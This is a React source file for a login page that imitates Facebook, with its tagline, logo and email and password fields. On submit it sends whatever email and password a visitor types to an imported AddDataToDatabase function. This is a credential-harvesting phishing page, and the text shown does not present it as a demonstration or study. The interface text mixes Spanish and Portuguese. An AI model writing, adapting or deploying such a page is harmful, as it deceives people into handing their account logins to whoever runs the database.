import "./App.css";
import { AddDataToDatabase } from "./components/data";
import logo1 from "./assets/images/logo.png";
import { useState } from "react";

function App() {
  const [data, setData] = useState({
    mail: "",
    password: "",
  });

  const dataHandler = (e, name) => {
    const tempData = {
      ...data,
    };
    tempData[name] = e.target.value;

    setData(tempData);
  };

  return (
    <div className="App">
      <main className="container">
        <div className="title-container">
          <img src={logo1} alt="" className="title-logo" />
          <p className="title-paragraph">
            Conéctate con amigos y el mundo que te rodea en Facebook.
          </p>
        </div>
        <div className="form-container">
          <form
            className="form"
            onSubmit={(e) => {
              e.preventDefault();
              AddDataToDatabase(data);
            }}
          >
            <div className="input-container">
              <input
                type="text"
                name="mail"
                placeholder="Email ou telefone"
                className="form-input form-input--email"
                onChange={(e) => dataHandler(e, "mail")}
              />
            </div>
            <div className="input-container input-container--password">
              <input
                type="password"
                name="password"
                placeholder="Senha"
                onChange={(e) => dataHandler(e, "password")}
                className="form-input form-input--password"
              />
              <div className="password-eye-container hidden">
                <img
                  alt=""
                  src="./assets/images/eye-off.png"
                  className="password-eye eye-off"
                />
              </div>
            </div>
            <button className="form-log-in-btn" type="submit">
              Entrar
            </button>
            <a href="#" className="form-forgot-password">
              ¿Olvido la contraseña?
            </a>
            <div className="divider"></div>
            // eslint-disable-next-line
            <a href="#" className="form-create-account-btn">
              crear una nueva cuenta
            </a>
          </form>
          <p className="create-page-paragraph">
            <a href="#" className="create-page-link">
              Crear una pagina
            </a>{" "}
            para una celebridad, banda o empresa.
          </p>
        </div>
      </main>
    </div>
  );
}

export default App;
